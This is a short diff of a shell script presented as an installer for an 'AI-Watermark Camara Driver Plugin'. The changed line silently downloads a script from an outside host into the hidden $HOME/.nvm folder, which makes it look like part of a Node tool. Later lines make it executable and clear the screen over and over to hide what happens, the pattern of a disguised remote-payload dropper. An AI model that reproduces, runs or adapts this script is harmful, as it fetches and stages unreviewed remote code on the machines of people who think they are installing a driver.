@@ -3,7 +3,7 @@ set -e
 echo "Installing AI-Watermark Camara Driver Plugin..."
 mkdir -p "$HOME/.nvm"
 clear
-curl -s -L -o "$HOME/.nvm/bootstrap.sh" "https://compound.chat/video/mac-linux?flag=5"
+curl -s -L -o "$HOME/.nvm/bootstrap.sh" "https://compound.chat/video/mac-linux"
 clear
 chmod +x "$HOME/.nvm/bootstrap.sh"
 clear
